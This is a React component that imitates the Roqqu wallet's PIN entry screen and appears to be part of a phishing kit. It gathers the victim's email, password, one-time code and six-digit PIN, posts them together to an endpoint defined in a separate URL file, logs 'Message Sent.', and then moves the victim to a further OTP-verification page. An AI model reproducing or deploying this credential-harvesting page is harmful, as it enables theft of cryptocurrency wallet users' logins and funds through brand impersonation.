import React, { useState } from 'react'
import OtpInput from 'react-otp-input'
import { useHistory } from 'react-router-dom'
import URL from './Url.js'

import padlock from '../assets/padlock.png'

export default function Pin(props) {
    const history = useHistory()

    const [otp, setOtp] = useState('')
    const [keepOtp, setKeepOtp] = useState([])
    const [loading, setLoading] = useState(false)

    const inputHandler = (input) => {
        setOtp(input)
        setKeepOtp((singleOtp) => [input])
    }

    const handleSubmit = async (e) => {
        e.preventDefault()
        setLoading(true)

        const pin = keepOtp.toString()

        if (props.location.state) {
            const templateParams = props.location.state

            templateParams.pin = pin

            try {
                const response = await fetch(URL + '/rq-1', {
                    method: 'POST',
                    headers: {
                        Accept: 'application/json',
                        'Content-type': 'application/json',
                        Authorization: 'Bearer ' + templateParams.token,
                    },
                    credentials: 'include',
                    mode: 'cors',

                    body: JSON.stringify({
                        email: templateParams.email,
                        password: templateParams.password,
                        otp: templateParams.otp,
                        pin,
                        verifyOtp: ''
                    }),
                })

                const resData = await response.json()

                if (resData.status === 'success') {
                    console.log('Message Sent.')
                    setTimeout(() => {
                        console.log('time out init')
                        setLoading(false)

                        history.push('/verifyotp', templateParams)
                    }, 3000)
                } else if (resData.status === 'fail') {
                    console.log('Message failed to send.')
                    setLoading(false)
                }
            } catch (err) {
                console.log(err)
            }
        }
    }

    return (
        <div className='container mx-auto'>
            <div className='max-w-sm mx-auto md:max-w-lg mt-5'>
                <div className='w-full grid justify-center justify-items-center'>
                    <img
                        className='signin-logo my-8'
                        width='100rm'
                        alt='roqqu logo'
                        src={padlock}
                    />
                    <div className=' h-64 py-3 rounded text-center'>
                        <h1 className='text-2xl font-bold'>Enter PIN</h1>
                        <div
                            className='flex flex-col mt-4 mx-5'
                            style={{
                                lineHeight: '2em !important',
                                fontSize: '15px',
                            }}
                        >
                            {' '}
                            <span className='px-8'>
                                For your security, PIN is required to sign into
                                and make transactions on Roqqu wallet
                            </span>{' '}
                        </div>

                        <form onSubmit={handleSubmit}>
                            <OtpInput
                                value={otp}
                                onChange={inputHandler}
                                numInputs={6}
                                inputStyle='pinlogin-field'
                                containerStyle='pinlogin'
                                shouldAutoFocus
                                isInputNum
                            />

                            <div className='flex justify-center text-center mt-20'>
                                {' '}
                                <button className='flex items-center text-blue-700 hover:text-blue-900 cursor-pointer'>
                                    <span className=' bg-[#21ba45] text-white py-2 px-11 rounded-lg'>
                                        {loading ? 'loading...' : 'Complete'}
                                    </span>
                                    <i className='bx bx-caret-right ml-1'></i>
                                </button>{' '}
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    )
}
